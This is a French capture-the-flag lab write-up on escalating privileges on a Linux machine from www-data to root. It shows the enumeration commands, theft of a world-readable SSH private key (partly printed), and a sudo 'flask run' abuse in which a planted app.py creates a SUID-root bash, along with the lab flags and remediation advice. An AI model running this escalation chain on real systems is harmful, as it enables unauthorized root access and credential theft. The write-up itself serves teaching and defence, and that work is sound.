# Fun With Functional 2 — Privilege Escalation Write-up

> Suite de « Fun With Functional ». La première partie avait donné une exécution de code en tant que `www-data` via l'upload d'un script Haskell. Cette partie documente le passage `www-data → prof → root`.

## 1. Rappel de l'accès initial

L'application web (port 5001) compile et exécute un script Haskell uploadé par l'utilisateur. Ce script permet d'exécuter des commandes système en tant que `www-data` via `System.Process` :

```haskell
import System.Process

main = do
    out <- readProcess "sh" ["-c", "LA_COMMANDE"] ""
    putStrLn out
```

Toute l'énumération ci-dessous a été réalisée en remplaçant `LA_COMMANDE` par les commandes voulues, puis en ré-uploadant le script.

> Remarque technique : `readProcess` échoue si la commande shell renvoie un code de sortie non nul (ex. `find` qui rencontre des dossiers interdits). On ajoute donc `; true` en fin de commande pour forcer un code de sortie 0 et récupérer la sortie.

## 2. Reconnaissance

```bash
nmap -sC -sV -Pn 10.10.0.23 -o notes.txt
```

Résultat :

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
5001/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.13.5)
|_http-title: FUN with functionnal !
```

Deux services : SSH (22) et le serveur web Python/Werkzeug (5001), point d'entrée déjà exploité.

## 3. Énumération des pistes de privilege escalation

Script exécuté via l'upload Haskell :

```bash
id; echo '---SUDO---'; sudo -l 2>&1; echo '---SUID---'; find / -perm -4000 -type f 2>/dev/null; true
```

Résultat :

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
---SUDO---
sudo: a password is required
---SUID---
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Analyse :

- **`sudo`** : un mot de passe est requis, et `www-data` n'en a pas (accès obtenu via une faille web). Piste écartée.
- **SUID** : la liste ne contient que les binaires SUID standards d'un système Debian. Aucun binaire custom exploitable. Piste écartée.

## 4. Énumération des utilisateurs, processus et configuration sudo

Script suivant :

```bash
id; echo '---USERS---'; ls -la /home; echo '---PROCESS---'; ps aux | grep -iE 'haskell|runghc|ghc|stack|root' | grep -v grep; echo '---CRON---'; cat /etc/crontab; ls -la /etc/cron.d/ 2>/dev/null; echo '---SUDOERS---'; ls -la /etc/sudoers.d/ 2>/dev/null; true
```

Éléments importants du résultat :

```text
---USERS---
drwxr-xr-x 1 prof prof 4096 prof
---PROCESS---
root  1  ... bash /root/scripts/init.sh
root  17 ... sudo -u www-data python3 /var/www/html/app.py
---SUDOERS---
-rw-r--r-- 1 root root   51 prof
```

Analyse :

- Un seul utilisateur humain : **`prof`**. C'est le maillon intermédiaire visé (`www-data → prof → root`).
- Le processus `sudo -u www-data python3 ... app.py` explique pourquoi le serveur tourne en `www-data`.
- **Anomalie clé** : le fichier `/etc/sudoers.d/prof` a les permissions `-rw-r--r--`, donc **lisible par tous** (y compris `www-data`). Une règle sudo ne devrait jamais être lisible par des tiers.

## 5. Lecture de la configuration sudo de `prof`

```bash
cat /etc/sudoers.d/prof; echo '---HOME_PROF---'; ls -la /home/prof; true
```

Résultat :

```text
prof ALL=(root) NOPASSWD: /usr/local/bin/flask run
---HOME_PROF---
drwxr-xr-x 1 prof prof 4096 .ssh
-rw-r--r-- 1 prof prof   37 user.txt
```

Découvertes :

- **`prof` peut exécuter `/usr/local/bin/flask run` en tant que root, sans mot de passe.** C'est la voie vers root (voir §8).
- Le dossier `/home/prof/.ssh` est accessible (`drwxr-xr-x`), ce qui laisse espérer une clé SSH lisible.

## 6. Vol de la clé privée SSH de `prof`

```bash
ls -la /home/prof/.ssh; echo '---ID_RSA---'; cat /home/prof/.ssh/id_rsa 2>/dev/null; true
```

Résultat :

```text
-rw-r--r-- 1 prof prof 1679 id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr
[...clé tronquée dans le rapport...]
-----END RSA PRIVATE KEY-----
```

**Vulnérabilité majeure** : la clé privée `id_rsa` de `prof` a les permissions `-rw-r--r--`, donc **lisible par n'importe quel utilisateur**. Une clé privée ne doit jamais l'être. Elle permet de s'authentifier en SSH comme `prof` sans mot de passe.

## 7. Connexion SSH en tant que `prof` et user flag

La clé a été enregistrée localement, protégée, puis utilisée pour se connecter :

```bash
# Sur la machine d'attaque (Exegol)
nano prof_key          # coller la clé, en incluant les lignes -----BEGIN/END-----
chmod 600 prof_key     # SSH exige une clé privée non lisible par les autres
ssh -i prof_key prof@10.10.0.40
```

> Notes de reproduction :
> - La clé doit impérativement inclure les lignes `-----BEGIN RSA PRIVATE KEY-----` et `-----END RSA PRIVATE KEY-----` (sinon SSH renvoie `invalid format`).
> - L'IP de la machine change à chaque redémarrage (ici passée de `10.10.0.23` à `10.10.0.40`). Utiliser l'IP courante.

Une fois connecté :

```bash
whoami
# prof
id
# uid=1000(prof) gid=1000(prof) groups=1000(prof)
cat user.txt
# EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}
```

**User flag :** `EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}`

## 8. Élévation vers root via abus de `sudo flask run`

Confirmation du privilège sudo une fois `prof` :

```bash
sudo -l
```

```text
Matching Defaults entries for prof on lambda:
    env_reset, secure_path=..., use_pty

User prof may run the following commands on lambda:
    (root) NOPASSWD: /usr/local/bin/flask run
```

### Principe de l'attaque

`flask run` démarre une application Flask en **important et exécutant un fichier Python**. Comme `sudo` lance `flask` en tant que **root**, le fichier Python importé s'exécute lui aussi en root. En fournissant notre propre fichier Python, on obtient une exécution de code arbitraire en root.

### Contrainte : `env_reset`

Première tentative en passant l'application via la variable d'environnement `FLASK_APP` :

```bash
sudo FLASK_APP=/tmp/pwn.py /usr/local/bin/flask run
```

Refusé :

```text
sudo: sorry, you are not allowed to set the following environment variables: FLASK_APP
```

`env_reset` empêche de passer des variables d'environnement à travers sudo. On contourne en s'appuyant sur le comportement **par défaut** de Flask : sans configuration, `flask run` charge un fichier nommé `app.py` situé dans le **répertoire courant**.

### Payload

Création d'un dossier de travail et d'un `app.py` malveillant :

```bash
mkdir -p /tmp/exploit
cat > /tmp/exploit/app.py << 'EOF'
import os
os.system('cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash')
EOF
```

Le payload, exécuté en root à l'import du module :

1. copie `/bin/bash` vers `/tmp/rootbash` (la copie appartient à root) ;
2. applique le bit SUID (`chmod 4755`) sur cette copie.

### Exécution

```bash
cd /tmp/exploit
sudo /usr/local/bin/flask run
```

Flask a importé notre `app.py` (exécutant le payload) puis affiché une erreur cosmétique car le fichier ne contient pas d'objet application Flask :

```text
Error: Failed to find Flask application or factory in module 'app'.
```

L'erreur est sans conséquence : l'import — donc le payload — a lieu **avant** que Flask ne cherche l'objet application. Le fichier SUID a bien été créé :

```bash
ls -l /tmp/rootbash
# -rwsr-xr-x 1 root root 1298416 /tmp/rootbash
```

Le `s` dans les permissions et le propriétaire `root` confirment un bash SUID-root.

### Obtention du shell root

```bash
/tmp/rootbash -p
```

L'option `-p` (privileged) empêche bash d'abandonner ses privilèges SUID au démarrage.

```bash
id
# uid=1000(prof) gid=1000(prof) euid=0(root) groups=1000(prof)
```

`euid=0(root)` : les commandes s'exécutent désormais avec les privilèges root.

## 9. Root flag

```bash
cat /root/root.txt
```

**Root flag :** `EPI{7VRns_0U7_p17H0N_1S_n0_83773r}`

## Chaîne d'attaque

```text
Upload de script Haskell → RCE en tant que www-data
        ↓
Énumération (sudo ❌, SUID ❌)
        ↓
Fichier /etc/sudoers.d/prof lisible par tous
        ↓
Découverte : prof peut lancer `flask run` en root (NOPASSWD)
        ↓
Clé privée SSH de prof (id_rsa) lisible par tous
        ↓
Connexion SSH en tant que prof (+ user flag)
        ↓
sudo flask run + app.py malveillant (env_reset contourné via app.py par défaut)
        ↓
Exécution de code Python en root → bash SUID-root
        ↓
/tmp/rootbash -p → euid=0(root)
        ↓
/root/root.txt
```

## Vulnérabilités identifiées

**1. Fichier de configuration sudo lisible par tous**
* *Composant :* `/etc/sudoers.d/prof` (`-rw-r--r--`).
* *Impact :* révèle les privilèges de `prof` à un utilisateur non privilégié, orientant directement l'attaque.
* *Risque :* divulgation d'information facilitant l'escalade.
* *Remédiation :* permissions strictes sur `/etc/sudoers.d/` (fichiers en `0440`, root uniquement).

**2. Clé privée SSH exposée en lecture à tous**
* *Composant :* `/home/prof/.ssh/id_rsa` (`-rw-r--r--`).
* *Impact :* n'importe quel utilisateur local peut voler la clé et usurper l'identité SSH de `prof`.
* *Risque :* prise de contrôle complète du compte `prof` sans mot de passe.
* *Remédiation :* permissions `0600` sur les clés privées ; régénérer la clé (celle-ci est compromise).

**3. Privilège sudo sur une commande exécutant du code arbitraire (abus `flask run`)**
* *Composant :* règle sudoers `(root) NOPASSWD: /usr/local/bin/flask run`.
* *Impact :* `flask run` importe et exécute du code Python, ce qui équivaut à donner un shell root complet.
* *Risque :* **élévation de privilèges vers root**. C'est la vulnérabilité critique de la machine. La logique est la même que pour d'autres binaires listés sur GTFOBins (`python`, `vim`, `find`, `awk`…).
* *Remédiation :* ne jamais accorder de sudo sur un binaire capable d'exécuter du code. Si `prof` doit démarrer un service Flask, l'encapsuler dans un service systemd verrouillé, avec un fichier d'application fixe non modifiable par `prof`, plutôt qu'un `flask run` libre dans un répertoire qu'il contrôle.

## Notes pour la soutenance

* **Différence pentest pédagogique / vrai monde** : ici on récupère un flag. Dans une vraie attaque, l'objectif serait la persistance, l'exfiltration ou le mouvement latéral — et un attaquant effacerait ses traces (`/tmp/rootbash`, `/tmp/exploit`, logs).
* **Reproduire l'abus `flask run` sans internet** : savoir réexpliquer que le vecteur est « une commande sudo qui exécute du code », classe entière de failles répertoriée sur GTFOBins.
* **Point technique à maîtriser** : pourquoi `-p` sur bash (préservation de l'euid root), et pourquoi l'erreur Flask est sans conséquence (payload exécuté à l'import, avant la recherche de l'objet app).
